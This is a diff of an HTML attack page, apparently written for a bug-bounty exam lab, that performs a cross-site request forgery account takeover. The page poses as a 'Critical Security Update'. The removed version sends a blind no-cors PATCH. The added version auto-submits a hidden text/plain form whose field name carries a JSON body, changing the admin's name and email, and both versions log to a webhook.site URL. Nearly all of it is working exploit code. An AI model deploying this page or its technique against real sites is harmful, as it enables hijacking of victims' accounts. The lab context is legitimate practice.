@@ -1,45 +1,25 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>System Monitor - Loading</title>
+    <title>Critical Security Update</title>
 </head>
 <body>
-    <h1>Decrypting Secure Message: 69e166fc...</h1>
+    <h1>Verifying Admin Session for Message: 69e166fc...</h1>
     
+    <form id="exploitForm" action="https://api-bugbounty-exam.hashacademy.co/api/auth/profile" method="POST" enctype="text/plain">
+        <input type="hidden" name='{"fullName":"Admin_Pwned","email":"rundlady@gongjua.com","address":{"street":"123","city":"Tripoli","state":"FL","zipCode":"33601","country":"US"},"ignore":"' value='"}'>
+    </form>
+
     <script>
-        const msgId = "69e166fcbee6d6b7c66275b0";
-        const webhook = "https://webhook.site/841a65c5-0695-459d-80da-91ae7613c283";
-        const targetApi = "https://api-bugbounty-exam.hashacademy.co/api/auth/profile";
-        const viewMessageUrl = "https://bugbounty-exam.hashacademy.co/admin/messages/" + msgId;
+        // 1. Log the attempt
+        fetch("https://webhook.site/841a65c5-0695-459d-80da-91ae7613c283?status=final_navigation_attempt");
 
-        // 1. Log to your webhook that the redirect chain has started
-        fetch(webhook + "?status=redirect_chain_started&id=" + msgId);
-
-        // 2. Perform the ATO (Account Takeover)
-        // We use fetch with 'no-cors' to send the PATCH blindly with cookies
-        fetch(targetApi, {
-            method: "PATCH",
-            mode: "no-cors",
-            headers: {
-                "Content-Type": "text/plain" 
-            },
-            body: JSON.stringify({
-                "fullName": "Admin_Pwned",
-                "email": "rundlady@gongjua.com"
-            })
-        }).then(() => {
-            // 3. FORCE the admin to view the internal message
-            // This satisfies the "Admin must view the message" requirement
-            window.location.href = viewMessageUrl;
-        }).catch(() => {
-            // Fallback redirect if fetch fails/blocks
-            window.location.href = viewMessageUrl;
-        });
-
-        // Safety timeout: Redirect after 1.5s no matter what
+        // 2. Submit the form as a TOP-LEVEL navigation
+        // This causes the Bot's tab to actually CHANGE to the API URL, 
+        // which forces the browser to include SameSite=Lax cookies.
         setTimeout(() => {
-            window.location.href = viewMessageUrl;
-        }, 1500);
+            document.getElementById('exploitForm').submit();
+        }, 1000);
     </script>
 </body>
 </html>
